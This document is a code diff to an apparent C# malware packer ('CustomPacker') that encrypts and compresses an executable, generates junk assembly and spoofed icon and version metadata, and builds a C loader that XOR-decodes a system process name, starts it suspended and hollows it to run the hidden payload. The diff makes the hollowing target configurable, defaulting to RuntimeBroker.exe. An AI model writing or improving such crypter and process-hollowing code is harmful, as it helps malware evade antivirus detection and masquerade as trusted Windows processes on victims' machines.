@@ -276,7 +276,7 @@ END
         var sb = new StringBuilder();
         sb.AppendLine("#include <windows.h>");
         if (!string.IsNullOrEmpty(iconPath))
-            sb.AppendLine($"1 ICON \"{iconPath!.Replace("\\", "\\\\")}\"");
+            sb.AppendLine($"1 ICON \"{EscRc(iconPath)}\"");
         if (meta != null)
         {
             var fv = ParseVersion(meta.FileVersion ?? "1.0.0.0");
@@ -504,7 +504,7 @@ static int {{fnHol}}(unsigned char* pe, unsigned int pe_len) {
     GetSystemDirectoryA(tpath,MAX_PATH);
     int sd=0; while(tpath[sd]) sd++;
     tpath[sd++]='\\';
-    unsigned char _tn[24]; memcpy(_tn,{{sHTgt.Var}},{{sHTgt.Len}}); _xd(_tn,{{sHTgt.Len}},0x{{sHTgt.Key:X2}});
+    unsigned char _tn[{{sHTgt.Len + 1}}]; memcpy(_tn,{{sHTgt.Var}},{{sHTgt.Len}}); _xd(_tn,{{sHTgt.Len}},0x{{sHTgt.Key:X2}});
     int ti=0; while(_tn[ti]) { tpath[sd++]=(char)_tn[ti++]; }
     tpath[sd]=0;
     /* Create target process suspended */
@@ -650,8 +650,9 @@ int WINAPI WinMain(HINSTANCE h, HINSTANCE p, LPSTR cmd, int show) {
     public static async Task ApplyAsync(
         string exePath,
         Action<string> log,
-        string?        iconPath = null,
-        LoaderMetadata? meta    = null)
+        string?         iconPath     = null,
+        LoaderMetadata? meta         = null,
+        string          hollowTarget = "RuntimeBroker.exe")
     {
         log("[*] CustomPacker: Starting...");
         byte[] raw = await File.ReadAllBytesAsync(exePath);
@@ -670,7 +671,7 @@ int WINAPI WinMain(HINSTANCE h, HINSTANCE p, LPSTR cmd, int show) {
 
         var (asmSrc, fn1, fn2, fn3) = GenerateAsmJunk();
         string loaderSrc = GenerateLoaderSource(cipher, key, iv,
-            (uint)compressed.Length, (uint)raw.Length, fn1, fn2, fn3);
+            (uint)compressed.Length, (uint)raw.Length, fn1, fn2, fn3, hollowTarget);
 
         string? clPath = await Task.Run(() => FindClExe(log));
         if (clPath == null) { log("[!] CustomPacker: cl.exe not found — skipped."); return; }
